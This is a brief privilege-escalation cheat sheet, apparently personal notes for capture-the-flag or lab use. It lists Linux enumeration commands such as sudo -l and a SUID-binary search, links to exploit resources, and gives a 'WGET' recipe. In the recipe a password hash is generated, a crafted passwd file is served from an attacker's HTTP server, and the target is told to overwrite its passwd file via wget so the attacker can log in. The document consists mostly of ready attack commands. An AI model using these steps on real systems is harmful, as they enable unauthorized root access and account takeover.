




sudo -l

find / -perm /4000 -type f -exec ls -lda {} \; 2>/dev/null


https://gtfobins.github.io/
https://lolbas-project.github.io/
https://www.exploit-db.com/

https://github.com/SolomonSklash/htbenum


## WGET

### Attacker

```
openssl passwd -1 -salt salt pass123
```

localy add to the an example passwd file and make it available on http

```
python3 -m http.server
```

### Target
```
wget -O passwd http://192.168.1.108:8000/passwd
```

login or su to that user with the password 'pass123'
